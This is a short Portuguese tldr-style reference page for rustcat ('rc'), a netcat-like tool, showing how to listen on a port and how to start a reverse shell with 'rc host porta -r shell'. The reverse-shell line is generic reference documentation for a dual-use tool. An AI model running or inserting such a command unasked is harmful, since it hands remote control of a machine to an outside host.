---
layout: page
title: common/rc (português (Brasil))
description: "Um ouvinte de porta moderno e simplista e shell reverso."
content_hash: 06e8583fd3987e30f03b96c8aacd4c05721f82b9
last_modified_at: 2024-10-05
related_topics:
  - title: English version
    url: /en/common/rc.html
    icon: bi bi-globe
  - title: Nederlands version
    url: /nl/common/rc.html
    icon: bi bi-globe
tldri18n_status: 2
---
# rc

Um ouvinte de porta moderno e simplista e shell reverso.
Similar a `nc`.
Mais informações: <https://github.com/robiot/rustcat/wiki/Basic-Usage>.

- Começa a escutar em uma porta específica:

`rc -lp `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">porta</span>

- Começa um shell reverso:

`rc `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">host</span>` `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">porta</span>` -r `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">shell</span>
